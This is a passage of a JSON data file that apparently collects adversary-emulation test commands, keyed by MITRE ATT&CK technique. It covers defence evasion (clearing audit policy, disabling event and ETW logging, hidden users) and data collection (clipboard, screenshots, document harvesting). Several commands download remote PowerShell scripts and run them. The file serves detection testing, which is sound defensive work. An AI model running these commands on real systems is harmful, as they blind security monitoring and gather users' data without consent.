         "command": "if ((Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V) { ; } else {Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All -Force};  ;  $VM = \"Atomic VM\"; New-VM -Name $VM -Generation 2; Set-VMFirmware $VM -EnableSecureBoot Off; Start-VM $VM"
      },
      {
         "technique_id": "T1564.006",
         "technique_name": "Run Virtual Instance",
         "tactic": "defense-evasion",
         "description": "ransomware payloads via virtual machines (VM). \n[Maze ransomware](https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/)\n",
         "command": "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxSVC.exe\" /reregserver && regsvr32 /S \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\" && rundll32 \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxRT.dll,RTR3Init\" && sc create VBoxDRV binpath= \"C:\\Program Files\\Oracle\\VirtualBox\\drivers\\VboxDrv.sys\" type= kernel start= auto error= normal displayname= PortableVBoxDRV && sc start VBoxDRV"
      },
      {
         "technique_id": "T1564.006",
         "technique_name": "Run Virtual Instance",
         "tactic": "defense-evasion",
         "description": "Create a simple VirtualBox VM and start up the machine\nCleanup command stops and deletes the newly created VM and associated files\nhttps://www.virtualbox.org/manual/ch08.html#vboxmanage-startvm\nhttps://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/\nhttps://attack.mitre.org/techniques/T1564/006/\n",
         "command": "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" createvm --name \"Atomic VM\" --register && \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" modifyvm \"Atomic VM\" --firmware efi && \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" startvm \"Atomic VM\""
      }
   ],
   "T1562.002": [
      {
         "technique_id": "T1562.002",
         "technique_name": "Impair Defenses: Disable Windows Event Logging",
         "tactic": "defense-evasion",
         "description": "Clear the Windows audit policy using auditpol utility. This action would stop certain audit events from being recorded in the security log.",
         "command": "auditpol /clear /y && auditpol /remove /allusers"
      },
      {
         "technique_id": "T1562.002",
         "technique_name": "Impair Defenses: Disable Windows Event Logging",
         "tactic": "defense-evasion",
         "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n",
         "command": "set-WebConfigurationProperty -PSPath \"IIS:\\Sites\\Default Web Site\\\" -filter \"system.webServer/httpLogging\" -name dontLog -value $true"
      },
      {
         "technique_id": "T1562.002",
         "technique_name": "Impair Defenses: Disable Windows Event Logging",
         "tactic": "defense-evasion",
         "description": "Wevtutil can be used to disable logs. \nNOTE: RansomEXX ransomware uses this to disable Security logs post-encryption.\n",
         "command": "wevtutil sl \"Microsoft-Windows-IKE/Operational\" /e:false"
      },
      {
         "technique_id": "T1562.002",
         "technique_name": "Impair Defenses: Disable Windows Event Logging",
         "tactic": "defense-evasion",
         "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n",
         "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"Default Web Site\" /section:httplogging /dontLog:true"
      },
      {
         "technique_id": "T1562.002",
         "technique_name": "Impair Defenses: Disable Windows Event Logging",
         "tactic": "defense-evasion",
         "description": "Disables the windows audit policy to prevent key host based telemetry being written into the event logs.\n[Solarigate example](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)",
         "command": "auditpol /set /category:\"Account Logon\" /success:disable /failure:disable && auditpol /set /category:\"Logon/Logoff\" /success:disable /failure:disable && auditpol /set /category:\"Detailed Tracking\" /success:disable"
      },
      {
         "technique_id": "T1562.002",
         "technique_name": "Impair Defenses: Disable Windows Event Logging",
         "tactic": "defense-evasion",
         "description": "Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog\n",
         "command": "\"PathToAtomicsFolder\\T1562.002\\bin\\Phant0m.exe\""
      },
      {
         "technique_id": "T1562.002",
         "technique_name": "Impair Defenses: Disable Windows Event Logging",
         "tactic": "defense-evasion",
         "description": "Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html",
         "command": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore; $url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"; $output = \"$env:TEMP\\Invoke-Phant0m.ps1\"; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url, $output); cd $env:TEMP; Import-Module .\\Invoke-Phant0m.ps1; Invoke-Phant0m"
      }
   ],
   "T1564.002": [
      {
         "technique_id": "T1564.002",
         "technique_name": "Hide Artifacts: Hidden Users",
         "tactic": "defense-evasion",
         "description": "Adversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.\nReference https://attack.mitre.org/techniques/T1564/002/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\n",
         "command": "NET USER AtomicOperator$ At0micRedTeam! /ADD /expires:never  && REG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v AtomicOperator$ /t REG_DWORD /d 0"
      },
      {
         "technique_id": "T1564.002",
         "technique_name": "Hide Artifacts: Hidden Users",
         "tactic": "defense-evasion",
         "description": "Add a hidden user on macOS using IsHidden optoin\n",
         "command": "sudo dscl . -create /Users/APT IsHidden 1"
      },
      {
         "technique_id": "T1564.002",
         "technique_name": "Hide Artifacts: Hidden Users",
         "tactic": "defense-evasion",
         "description": "Add a hidden user on macOS using Unique ID < 500 (users with that ID are hidden by default)\n",
         "command": "sudo dscl . -create /Users/APT UniqueID 333"
      }
   ],
   "T1036": [
      {
         "technique_id": "T1036",
         "technique_name": "Masquerading",
         "tactic": "defense-evasion",
         "description": "When the file is unzipped and the README.cmd file opened, it executes and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique [as reported here](https://twitter.com/ffforward/status/1481672378639912960)",
         "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\") { ; } else {New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null; Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\"};  ;  Expand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\" -DestinationPath \"$env:userprofile\\Downloads\\T1036\" -Force; cd \"$env:userprofile\\Downloads\\T1036\"; cmd /c \"$env:userprofile\\Downloads\\T1036\\README.cmd\" >$null 2>$null"
      },
      {
         "technique_id": "T1036",
         "technique_name": "Masquerading",
         "tactic": "defense-evasion",
         "description": "It may be suspicious seeing a file copy of an EXE in System32 or SysWOW64 to a non-system directory or executing from a non-system directory.",
         "command": "copy-item \"$env:windir\\System32\\cmd.exe\" -destination \"$env:allusersprofile\\cmd.exe\"; start-process \"$env:allusersprofile\\cmd.exe\"; sleep -s 5 ; stop-process -name \"cmd\" | out-null"
      }
   ],
   "T1553.003": [
      {
         "technique_id": "T1553.003",
         "technique_name": "Subvert Trust Controls: SIP and Trust Provider Hijacking",
         "tactic": "defense-evasion",
         "description": "Registers a DLL that logs signature checks, mimicking SIP hijacking. This test uses a DLL from \nhttps://github.com/gtworek/PSBits/tree/master/SIP and registers it using regsvr32, thereby causing\nthe system to utilize it during signature checks, and logging said checks.\n",
         "command": "regsvr32.exe #{dll_payload}"
      }
   ],
   "T1562.006": [
      {
         "technique_id": "T1562.006",
         "technique_name": "Impair Defenses: Indicator Blocking",
         "tactic": "defense-evasion",
         "description": "Emulates modification of syslog configuration.\n",
         "command": "if [ -f \"/etc/syslog.conf\" ]; then sed -i '$ a #art_test_1562_006_2' /etc/syslog.conf; fi; if [ -f \"/etc/rsyslog.conf\" ]; then sed -i '$ a #art_test_1562_006_2' /etc/rsyslog.conf; fi; if [ -f \"/etc/syslog-ng/syslog-ng.conf\" ]; then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/syslog-ng.conf; fi"
      },
      {
         "technique_id": "T1562.006",
         "technique_name": "Impair Defenses: Indicator Blocking",
         "tactic": "defense-evasion",
         "description": "This test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions.",
         "command": "cmd /c \"#{ps_exec_location}\" -accepteula -i -s cmd.exe /c logman update trace \"#{session}\" --p \"#{provider}\" -ets"
      },
      {
         "technique_id": "T1562.006",
         "technique_name": "Impair Defenses: Indicator Blocking",
         "tactic": "defense-evasion",
         "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\n",
         "command": "New-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled  -PropertyType DWord -Value 0 -Force"
      },
      {
         "technique_id": "T1562.006",
         "technique_name": "Impair Defenses: Indicator Blocking",
         "tactic": "defense-evasion",
         "description": "Disables ETW for the .NET Framework using PowerShell to update the Windows registry",
         "command": "New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType \"DWord\" -Force"
      },
      {
         "technique_id": "T1562.006",
         "technique_name": "Impair Defenses: Indicator Blocking",
         "tactic": "defense-evasion",
         "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\n",
         "command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" /v Enabled /t REG_DWORD /d 0 /f"
      },
      {
         "technique_id": "T1562.006",
         "technique_name": "Impair Defenses: Indicator Blocking",
         "tactic": "defense-evasion",
         "description": "Disables ETW for the .NET Framework using the reg.exe utility to update the Windows registry",
         "command": "REG ADD HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /t REG_DWORD /d 0"
      },
      {
         "technique_id": "T1562.006",
         "technique_name": "Impair Defenses: Indicator Blocking",
         "tactic": "defense-evasion",
         "description": "Emulates modification of auditd configuration files\n",
         "command": "sed -i '$ a #art_test_1562_006_1' /etc/audisp/audispd.conf; if [ -f \"/etc/auditd.conf\" ]; then sed -i '$ a #art_test_1562_006_1' /etc/auditd.conf; else sed -i '$ a #art_test_1562_006_1' /etc/audit/auditd.conf; fi ; sed -i '$ a #art_test_1562_006_1' /etc/libaudit.conf"
      }
   ],
   "T1027.006": [
      {
         "technique_id": "T1027.006",
         "technique_name": "HTML Smuggling",
         "tactic": "defense-evasion",
         "description": "The HTML file will download an ISO file from [T1553.005](https://github.com/redcanaryco/atomic-red-team/blob/d0dad62dbcae9c60c519368e82c196a3db577055/atomics/T1553.005/bin/FeelTheBurn.iso) without user interaction. \nThe HTML file is based off of the work from [Stan Hegt](https://outflank.nl/blog/2018/08/14/html-smuggling-explained/)\n",
         "command": "if (Test-Path \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html\") { ; } else {New-Item -Type Directory \"PathToAtomicsFolder\\T1027.006\\bin\\\" -ErrorAction ignore | Out-Null; Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.006/bin/T1027_006_Remote.html\" -OutFile \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html\"};  ;  & \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_remote.html\""
      }
   ],
   "T1127.001": [
      {
         "technique_id": "T1127.001",
         "technique_name": "Trusted Developer Utilities Proxy Execution: MSBuild",
         "tactic": "defense-evasion",
         "description": "Executes the code in a project file using msbuild.exe. The default Visual Basic example file (vb.xml) will simply print \"Hello from a Visual Basic inline task!\" to the screen.\n",
         "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe \"f8ed8b_vb.xml\""
      },
      {
         "technique_id": "T1127.001",
         "technique_name": "Trusted Developer Utilities Proxy Execution: MSBuild",
         "tactic": "defense-evasion",
         "description": "Executes the code in a project file using msbuild.exe. The default C# project example file (T1127.001.csproj) will simply print \"Hello From a Code Fragment\" and \"Hello From a Class.\" to the screen.\n",
         "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe \"e93bc3_T1127.001.csproj\""
      }
   ],
   "T1218.009": [
      {
         "technique_id": "T1218.009",
         "technique_name": "Signed Binary Proxy Execution: Regsvcs/Regasm",
         "tactic": "defense-evasion",
         "description": "Executes the Uninstall Method, No Admin Rights Required. Upon execution, \"I shouldn't really execute either.\" will be displayed.\n",
         "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"%tmp%\\T1218.009.dll\" /target:library \"aaaa08_T1218.009.cs\" && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U %tmp%\\T1218.009.dll"
      },
      {
         "technique_id": "T1218.009",
         "technique_name": "Signed Binary Proxy Execution: Regsvcs/Regasm",
         "tactic": "defense-evasion",
         "description": "Executes the Uninstall Method, No Admin Rights Required, Requires SNK. Upon execution, \"I shouldn't really execute\" will be displayed\nalong with other information about the assembly being installed.\n",
         "command": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='; $Content = [System.Convert]::FromBase64String($key); Set-Content $env:Temp\\key.snk -Value $Content -Encoding Byte; C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"$Env:TEMP\\T1218.009.dll\" /target:library /keyfile:$env:Temp\\key.snk aaaa08_T1218.009.cs; C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe $Env:TEMP\\T1218.009.dll"
      }
   ],
   "T1216": [
      {
         "technique_id": "T1216",
         "technique_name": "Signed Script Proxy Execution",
         "tactic": "defense-evasion",
         "description": "Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.\nUpon execution, calc.exe will be launched.\n",
         "command": "C:\\windows\\system32\\SyncAppvPublishingServer.vbs \"\\n;Start-Process calc\""
      },
      {
         "technique_id": "T1216",
         "technique_name": "Signed Script Proxy Execution",
         "tactic": "defense-evasion",
         "description": "Executes the signed manage-bde.wsf script with options to execute an arbitrary command.\n",
         "command": "set comspec=%windir%\\System32\\calc.exe && cscript %windir%\\System32\\manage-bde.wsf"
      }
   ],
   "T1115": [
      {
         "technique_id": "T1115",
         "technique_name": "Clipboard Data",
         "tactic": "collection",
         "description": "Add data to clipboard to copy off or execute commands from.\n",
         "command": "dir | clip && echo \"T1115\" > %temp%\\T1115.txt && clip < %temp%\\T1115.txt"
      },
      {
         "technique_id": "T1115",
         "technique_name": "Clipboard Data",
         "tactic": "collection",
         "description": "Echo a command to clipboard and execute it",
         "command": "echo ifconfig | pbcopy; $(pbpaste)"
      },
      {
         "technique_id": "T1115",
         "technique_name": "Clipboard Data",
         "tactic": "collection",
         "description": "This module copies the data stored in the user's clipboard and writes it to a file, $env:TEMP\\atomic_T1115_clipboard_data.txt\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Set-Clipboard -value \"Atomic T1115 Test, grab data from clipboard via VBA\"; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1115\\src\\T1115-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\""
      },
      {
         "technique_id": "T1115",
         "technique_name": "Clipboard Data",
         "tactic": "collection",
         "description": "Utilize Linux Xclip to copy history and place in clipboard then output to a history.txt file. Successful execution will capture history and output to a file on disk.\n",
         "command": "apt install xclip -y; history | tail -n 30 | xclip -sel clip; xclip -o > history.txt"
      },
      {
         "technique_id": "T1115",
         "technique_name": "Clipboard Data",
         "tactic": "collection",
         "description": "Utilize PowerShell to echo a command to clipboard and execute it\n",
         "command": "echo Get-Process | clip; Get-Clipboard | iex"
      },
      {
         "technique_id": "T1115",
         "technique_name": "Clipboard Data",
         "tactic": "collection",
         "description": "copy the contents for the clipboard and print them",
         "command": "pbpaste\n"
      }
   ],
   "T1113": [
      {
         "technique_id": "T1113",
         "technique_name": "Screen Capture",
         "tactic": "collection",
         "description": "Use screencapture command to collect a full desktop screenshot\n",
         "command": "screencapture /tmp/T1113_desktop.png"
      },
      {
         "technique_id": "T1113",
         "technique_name": "Screen Capture",
         "tactic": "collection",
         "description": "Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.\n\n[Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen\n",
         "command": "Add-Type -AssemblyName System.Windows.Forms; $screen = [Windows.Forms.SystemInformation]::VirtualScreen; $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height; $graphic = [Drawing.Graphics]::FromImage($bitmap); $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size); $bitmap.Save(\"$env:TEMP\\T1113.png\")"
      },
      {
         "technique_id": "T1113",
         "technique_name": "Screen Capture",
         "tactic": "collection",
         "description": "Use xwd command to collect a full desktop screenshot and review file with xwud\n",
         "command": "xwd -root -out /tmp/T1113_desktop.xwd; xwud -in /tmp/T1113_desktop.xwd"
      },
      {
         "technique_id": "T1113",
         "technique_name": "Screen Capture",
         "tactic": "collection",
         "description": "Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour\n",
         "command": "cmd /c start /b psr.exe /start /output c:\\temp\\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12; Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W; [W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0); cmd /c \"timeout 5 > NULL && psr.exe /stop\""
      },
      {
         "technique_id": "T1113",
         "technique_name": "Screen Capture",
         "tactic": "collection",
         "description": "Use screencapture command to collect a full desktop screenshot\n",
         "command": "screencapture -x /tmp/T1113_desktop.png"
      },
      {
         "technique_id": "T1113",
         "technique_name": "Screen Capture",
         "tactic": "collection",
         "description": "Use import command from ImageMagick to collect a full desktop screenshot\n",
         "command": "if import -help > /dev/null 2>&1; then : ; else sudo apt install graphicsmagick-imagemagick-compat; fi;  ;  import -window root /tmp/T1113_desktop.png"
      },
      {
         "technique_id": "T1113",
         "technique_name": "Screen Capture",
         "tactic": "collection",
         "description": "capture the contents of the screen",
         "command": "for i in {1..5}; do screencapture -t png screen-$i.png; echo \"$(cd \"$(dirname \"$1\")\"; pwd -P)/$(basename \"screen-$i.png\")\"; sleep 5; done;\n"
      }
   ],
   "T1039": [
      {
         "technique_id": "T1039",
         "technique_name": "Data from Network Shared Drive",
         "tactic": "collection",
         "description": "Copy from sensitive File from the c$ of another LAN computer with powershell\nhttps://twitter.com/SBousseaden/status/1211636381086339073",
         "command": "copy-item -Path \"\\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password\" -Destination \"$Env:TEMP\\Easter_egg.password\""
      },
      {
         "technique_id": "T1039",
         "technique_name": "Data from Network Shared Drive",
         "tactic": "collection",
         "description": "Copy from sensitive File from the c$ of another LAN computer with copy cmd\nhttps://twitter.com/SBousseaden/status/1211636381086339073",
         "command": "copy \\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password %TEMP%\\Easter_egg.password"
      }
   ],
   "T1005": [
      {
         "technique_id": "T1005",
         "technique_name": "Data from Local System",
         "tactic": "collection",
         "description": "This test searches for files of certain extensions and saves them to a single zip file prior to extraction.                              \n",
         "command": "$startingDirectory = \"C:\\Users\"; $outputZip = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1005\"; $fileExtensionsString = \".doc, .docx, .txt\" ; $fileExtensions = $fileExtensionsString -split \", \"; New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null; Function Search-Files {;   param (;     [string]$directory;   );   $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {;     $fileExtensions -contains $_.Extension.ToLower();   };   return $files; }; $foundFiles = Search-Files -directory $startingDirectory; if ($foundFiles.Count -gt 0) {;   $foundFilePaths = $foundFiles.FullName;   Compress-Archive -Path $foundFilePaths -DestinationPath \"$outputZip\\data.zip\";   Write-Host \"Zip file created: $outputZip\\data.zip\";   } else {;       Write-Host \"No files found with the specified extensions.\";   }"
      },
      {
         "technique_id": "T1005",
         "technique_name": "Data from Local System",
         "tactic": "collection",
         "description": "This ability will locate directories that are cloned Git repositories.",
         "command": "for directoryname in $(find /home/ -name '.git' -type d 2>/dev/null | head -5); do\n\tprintf \"$(dirname \"$directoryname\")\\n\";\ndone;\n"
      },
      {
         "technique_id": "T1005",
         "technique_name": "Data from Local System",
         "tactic": "collection",
         "description": "See the raw content of a socket",
         "command": "curl #{remote.host.socket}\n"
      },
      {
         "technique_id": "T1005",
         "technique_name": "Data from Local System",
         "tactic": "collection",
         "description": "Grep for all emails for the given target company",
         "command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"\\b[A-Za-z0-9._%+-]+@#{target.org.name}\\b\" 2>/dev/null {} \\;\n"
      },
      {
         "technique_id": "T1005",
         "technique_name": "Data from Local System",
         "tactic": "collection",
         "description": "Locate files deemed sensitive",
         "command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n"
      },
      {
         "technique_id": "T1005",
         "technique_name": "Data from Local System",
         "tactic": "collection",
         "description": "Grep for IP addresses in file system per user",
         "command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"(($(echo #{domain.broadcast.ip} | cut -d. -f-2))\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" 2>/dev/null {} \\;\n"
      },
      {
         "technique_id": "T1005",
         "technique_name": "Data from Local System",
         "tactic": "collection",
         "description": "Search for valid SSH commands in the config file",
         "command": "pip install stormssh && storm list\n"
      }
   ],
   "T1530": [
      {
         "technique_id": "T1530",
         "technique_name": "Data from Cloud Storage Object",
         "tactic": "collection",
         "description": "Upon successful execution, this test will utilize a wordlist to enumerate the public facing containers and blobs of a specified Azure storage account. \nSee https://www.netspi.com/blog/technical/cloud-penetration-testing/anonymously-enumerating-azure-file-resources/ . \n",
         "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"; Invoke-EnumerateAzureBlobs -base secure -permutations \"PathToAtomicsFolder\\..\\ExternalPayloads\\permutations.txt\" -outputfile \"$env:temp\\T1530Test1.txt\""
      },
      {
         "technique_id": "T1530",
         "technique_name": "Data from Cloud Storage Object",
         "tactic": "collection",
         "description": "Upon successful execution, this test will test for anonymous access to Azure storage containers by invoking a web request and outputting the results to a file. \nThe corresponding response could then be interpreted to determine whether or not the resource/container exists, as well as other information. \nSee https://ninocrudele.com/the-three-most-effective-and-dangerous-cyberattacks-to-azure-and-countermeasures-part-2-attack-the-azure-storage-service     \n",
         "command": "try{$response = invoke-webrequest \"https://T1530Test2.blob.core.windows.net/None/None\" -method \"GET\"}; catch [system.net.webexception]; {if($_.Exception.Response -ne $null); {$Response = $_.Exception.Response.GetResponseStream(); $ReadResponse = New-Object System.IO.StreamReader($Response); $ReadResponse.BaseStream.Position = 0; $responseBody = $ReadResponse.ReadToEnd()}; else {$responseBody = \"The storage account could not be anonymously accessed.\"}}; \"Response received for T1530Test2.blob.core.windows.net/None/None: $responsebody\" | out-file -filepath $env:temp\\T1530Test2.txt -append"
      },
      {
         "technique_id": "T1530",
         "technique_name": "Data from Cloud Storage Object",
         "tactic": "collection",
         "description": "Upon successful execution, this test will test for anonymous access to AWS S3 buckets and dumps all the files to a local folder. \n",
         "command": "aws --no-sign-request s3 cp --recursive s3://redatomic-test2 /tmp/redatomic-test2"
      }
   ],
   "T1119": [
      {
         "technique_id": "T1119",
         "technique_name": "Automated Collection",
         "tactic": "collection",
         "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n",
         "command": "Get-Service > $env:TEMP\\T1119_1.txt; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt; Get-Process > $env:TEMP\\T1119_3.txt"
      },
      {
         "technique_id": "T1119",
         "technique_name": "Automated Collection",
         "tactic": "collection",
         "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_powershell_collection\nto see what was collected.\n",
         "command": "New-Item -Path $env:TEMP\\T1119_powershell_collection -ItemType Directory -Force | Out-Null; Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\\T1119_powershell_collection}"
      },
      {
         "technique_id": "T1119",
         "technique_name": "Automated Collection",
         "tactic": "collection",
         "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_command_prompt_collection\nto see what was collected.\n",
         "command": "mkdir %temp%\\T1119_command_prompt_collection >nul 2>&1 && dir c: /b /s .docx | findstr /e .docx && for /R c:\\ %f in (*.docx) do copy /Y %f %temp%\\T1119_command_prompt_collection"
      },
      {
         "technique_id": "T1119",
         "technique_name": "Automated Collection",
         "tactic": "collection",
         "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n",
         "command": "sc query type=service > %TEMP%\\T1119_1.txt && doskey /history > %TEMP%\\T1119_2.txt && wmic process list > %TEMP%\\T1119_3.txt && tree C:\\AtomicRedTeam\\atomics > %TEMP%\\T1119_4.txt"
      },
      {
         "technique_id": "T1119",
         "technique_name": "Automated Collection",
         "tactic": "collection",
         "description": "Highly configurable file finder and stager for Linux and Windows. Drops a payload file to the host to parse\narguments rather than running multiple commands for each fact (e.g., each file type). This ability allows for a safe\nmode, only staging files found that have the appropriate file ending. The staging directory is configurable but\ndefaults to the current user's Recycle Bin (Windows) and /tmp (Linux). Payload files include default values for all\nparameters (matching the base fact source - File Search and Stage). Options for searches: file extensions (include,\nexclude [windows]), directories (include, exclude), accessed date cutoff, modified date cutoff, sensitive search\nstrings in files or titles.\n",
         "command": ".\\file_search.ps1 -Extensions '#{windows.included.extensions}' -ExcludedExtensions '#{windows.excluded.extensions}'\n -Directories '#{windows.included.directories}' -ExcludedDirectories '#{windows.excluded.directories}'\n -AccessedCutoff #{file.last.accessed} -ModifiedCutoff #{file.last.modified}\n -SearchStrings '#{file.sensitive.content}' -StagingDirectory '#{windows.staging.location}'\n -SafeMode $#{safe.mode.enabled} -PseudoExtension #{pseudo.data.identifier}\n"
      }
   ],
   "T1074.001": [
      {
         "technique_id": "T1074.001",
         "technique_name": "Data Staged: Local Data Staging",
         "tactic": "collection",
         "description": "Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,\nverify that the file is saved in the temp directory.\n",
         "command": "Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat\" -OutFile $env:TEMP\\discovery.bat"
      },
      {
         "technique_id": "T1074.001",
         "technique_name": "Data Staged: Local Data Staging",
         "tactic": "collection",
